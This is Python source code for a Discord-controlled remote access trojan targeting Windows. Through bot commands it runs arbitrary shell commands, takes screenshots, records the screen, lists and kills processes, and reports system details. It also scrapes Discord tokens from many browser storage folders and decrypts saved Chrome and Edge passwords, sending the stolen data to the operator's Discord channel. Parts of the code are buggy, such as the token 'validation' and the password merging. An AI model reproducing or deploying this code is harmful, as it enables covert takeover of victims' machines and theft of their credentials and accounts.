import discord
import platform
import psutil
from discord.ext import commands
import subprocess
import socket
import uuid
import os
import pyautogui
import imageio
import asyncio
import numpy as np
import time
import pyaudio
import wave
import re
import base64
import time
import win32crypt
from datetime import datetime, timedelta
import sqlite3
import json
from Crypto.Cipher import AES
import shutil
import sys 


if len(sys.argv) < 2:
    print("Please provide a valid Discord bot token as a command-line argument.")
    sys.exit(1)

TOKEN = sys.argv[1]
SCREEN_SHARE_DURATION = 15
SCREEN_CAPTURE_FPS = 15
SCREEN_CAPTURE_FILENAME = 'screen_capture.mp4'
VOICE_CHANNEL_ID = 1129440490413109331
VOICE_CAPTURE_DURATION = 15
SYSTEM_AUDIO_DEVICE_INDEX = 0
MICROPHONE_DEVICE_INDEX = 1
AUDIO_OUTPUT_FILENAME = 'voice_capture.wav'
screen_width, screen_height = pyautogui.size()

intents = discord.Intents.default()
intents.typing = True
intents.presences = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

p = pyaudio.PyAudio()


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')



@bot.command()
async def sysinfo(ctx):
    print('Sysinfo command received')
    system_info = f"**System Information**\n\n"
    system_info += f"Platform: {platform.system()} {platform.release()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"Total Memory: {psutil.virtual_memory().total >> 30} GB\n"
    system_info += f"CPU Usage: {psutil.cpu_percent()}%\n"
    ip_address = socket.gethostbyname(socket.gethostname())
    system_info += f"IP Address: {ip_address}\n"
    mac_address = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i + 2] for i in range(0, 12, 2))
    system_info += f"MAC Address: {mac_address}\n"

    await ctx.send(system_info)




@bot.command(name="shell", help="executes remote shell command")
async def shell(ctx, *, command):
    try:
        if command.startswith('cd'):
            target_directory = command.split(' ', 1)[1]
            os.chdir(target_directory)
            await ctx.send(f"Changed directory to: {os.getcwd()}")
        else:
            output = subprocess.run(command, shell=True, capture_output=True, cwd=os.getcwd())
            if output.returncode == 0:
                await ctx.send(f"Command executed successfully:\n```\n{output.stdout.decode()}\n```")
            else:
                await ctx.send(f"Command execution failed:\n```\n{output.stderr.decode()}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred while executing the command:\n```\n{str(e)}\n```")

@bot.command(name='bot_help')
async def custom_help(ctx):
    print('Custom Help command received')
    help_message = "**Bot Commands**\n\n"
    help_message += "**!sysinfo**\nGet system information\n\n"
    help_message += "**!file**\nShare a file with the bot\n\n"
    help_message += "**!shell**\nExecute a shell command\n\n"
    help_message += "**!bot_help**\nDisplay this help message\n\n"

    await ctx.send(help_message)


@bot.command(name="showprocess", help="shows all the processes currently running")
async def showprocess(ctx):
    process_list = []
    for process in psutil.process_iter(['pid', 'name']):
        process_list.append(f"PID: {process.info['pid']}, Name: {process.info['name']}")

    if process_list:
        output = "\n".join(process_list)
        with open('processes.txt', 'w') as file:
            file.write(output)
        
        await ctx.send(file=discord.File('processes.txt'))
    else:
        await ctx.send("No processes found.")

@bot.command(name="kill", help="kills a process")
async def kill(ctx, pid: int):
    try:
        process = psutil.Process(pid)
        process.terminate()
        await ctx.send(f"Process with PID {pid} has been terminated.")
    except psutil.NoSuchProcess:
        await ctx.send(f"No process found with PID {pid}.")    


@bot.command(name="screenshot", help="sends a screenshot")
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)
    await ctx.send(file=discord.File(screenshot_path))

@bot.command(name="screenshare", help="starts a screenshare for 15 seconds")
async def screenshare(ctx):
    await ctx.send("Starting screen share...Wait 15 seconds")
    screen_size = (screen_width, screen_height)
    screen_capture = imageio.get_writer(SCREEN_CAPTURE_FILENAME, fps=SCREEN_CAPTURE_FPS)

    start_time = time.time()
    end_time = start_time + SCREEN_SHARE_DURATION

    while time.time() < end_time:
        screen_frame = pyautogui.screenshot(region=(0, 0, screen_width, screen_height))
        screen_frame = np.array(screen_frame)
        screen_capture.append_data(screen_frame)

    screen_capture.close()

    await ctx.send(file=discord.File(SCREEN_CAPTURE_FILENAME))
    os.remove(SCREEN_CAPTURE_FILENAME)

def extract_tokens():
    tokens = []
    regexp = r"[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}"
    paths = {
        'Discord': os.getenv("appdata") + "\\discord\\Local Storage\\leveldb\\",
        'Discord Canary': os.getenv("appdata") + "\\discordcanary\\Local Storage\\leveldb\\",
        'Lightcord': os.getenv("appdata") + "\\Lightcord\\Local Storage\\leveldb\\",
        'Discord PTB': os.getenv("appdata") + "\\discordptb\\Local Storage\\leveldb\\",
        'Opera': os.getenv("appdata") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        'Opera GX': os.getenv("appdata") + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        'Amigo': os.getenv("localappdata") + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        'Torch': os.getenv("localappdata") + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        'Kometa': os.getenv("localappdata") + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        'Orbitum': os.getenv("localappdata") + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        'CentBrowser': os.getenv("localappdata") + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        '7Star': os.getenv("localappdata") + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        'Sputnik': os.getenv("localappdata") + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        'Vivaldi': os.getenv("localappdata") + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        'Chrome SxS': os.getenv("localappdata") + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        'Chrome': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        'Chrome1': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        'Chrome2': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
        'Chrome3': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
        'Chrome4': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
        'Chrome5': os.getenv("localappdata") + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
        'Epic Privacy Browser': os.getenv("localappdata") + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        'Microsoft Edge': os.getenv("localappdata") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
        'Uran': os.getenv("localappdata") + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
        'Yandex': os.getenv("localappdata") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        'Brave': os.getenv("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        'Iridium': os.getenv("localappdata") + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
    }

    for path in paths.values():
        if not os.path.exists(path):
            continue

        for file_name in os.listdir(path):
            if file_name[-3:] not in ["log", "ldb"]:
                continue

            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(regexp, line):
                    tokens.append(token)

    return tokens

async def validate_tokens(tokens, bot):
    valid_tokens = []
    for token in tokens:
        try:
            user = await bot.fetch_user(bot.user.id)
            valid_tokens.append(token)
        except discord.Forbidden:
            continue

    return valid_tokens

@bot.command(name="get_token", help="grabs tokens")
async def get_token(ctx):
    print("Extract tokens command received")
    discord_tokens = extract_tokens()

    if discord_tokens:
        valid_tokens = await validate_tokens(discord_tokens, bot)
        if valid_tokens:
            extracted_tokens = "\n".join(valid_tokens)
            await ctx.send(f"Extracted and validated Discord tokens:\n```{extracted_tokens}```")
        else:
            await ctx.send("No valid Discord tokens found.")
    else:
        await ctx.send("No Discord tokens found.")


def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

async def get_passwords_edge(ctx):
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        await ctx.send("Edge browser not detected!")
        return
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                domain = get_domain(url)
                result[domain] = [username, decrypted_password]
    except:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        print(e)
        pass
    file_path = "passwords.txt"
    with open(file_path, "w") as f:
        for domain, values in result.items():
            username, password = values
            f.write(f"Domain: {domain}\nUsername: {username}\nPassword: {password}\n\n")

    await ctx.send(file=discord.File(file_path))

@bot.command()
async def get_passwords(ctx):
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    try:
        result = main()
    except:
        time.sleep(1)

    try:
        await get_passwords_edge(ctx)
        result2 = ctx.message.content
        for i in result2.keys():
            result[i] = result2[i]
    except:
        time.sleep(1)
    file_path = "passwords.txt"
    with open(file_path, "w") as f:
        for domain, values in result.items():
            username, password = values
            f.write(f"Domain: {domain}\nUsername: {username}\nPassword: {password}\n\n")

    await ctx.send(file=discord.File(file_path))

def get_domain(url):
    parsed_url = url.split("//")[-1]
    domain = parsed_url.split("/")[0]
    return domain

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            domain = get_domain(action_url)
            result[domain] = [username, password]
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(file_name)
    except:
        pass
    return result



@bot.event
async def on_disconnect():
    await bot.http.session.close()


print('Starting the bot...')
bot.run(TOKEN)
